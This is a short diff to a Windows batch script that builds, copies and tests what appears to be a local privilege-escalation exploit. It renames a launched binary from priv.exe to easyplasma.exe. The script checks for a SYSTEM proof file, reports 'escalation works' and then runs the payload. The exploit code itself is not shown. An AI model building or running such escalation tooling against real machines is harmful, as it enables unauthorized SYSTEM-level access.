@@ -40,7 +40,7 @@ if %BUILD_ERR% neq 0 (
 echo.
 echo [*] Copying outputs back...
 if not exist "%OUT%" mkdir "%OUT%"
-for %%f in (priv.exe syshost.exe priv.bat miniplasma.exe payload_exe.exe GreenPlasma.exe ctf_alpc.exe) do (
+for %%f in (easyplasma.exe syshost.exe priv.bat miniplasma.exe payload_exe.exe GreenPlasma.exe ctf_alpc.exe) do (
     if exist "%DST%\%%f" (
         copy /Y "%DST%\%%f" "%SRC%\%%f" >nul 2>&1 || echo [!] SRC copy skipped for %%f
         copy /Y "%DST%\%%f" "%OUT%\%%f" >nul 2>&1
@@ -60,8 +60,8 @@ if exist "C:\Temp\SYSTEM_PROOF.txt" (
     echo [+] TEST PASSED - escalation works:
     type "C:\Temp\SYSTEM_PROOF.txt"
     echo.
-    echo [*] Launching priv.exe...
-    priv.exe
+    echo [*] Launching easyplasma.exe...
+    easyplasma.exe
 ) else (
     echo [-] TEST FAILED - SYSTEM_PROOF.txt not found
     echo [-] Check miniplasma output above. Not launching priv.exe.
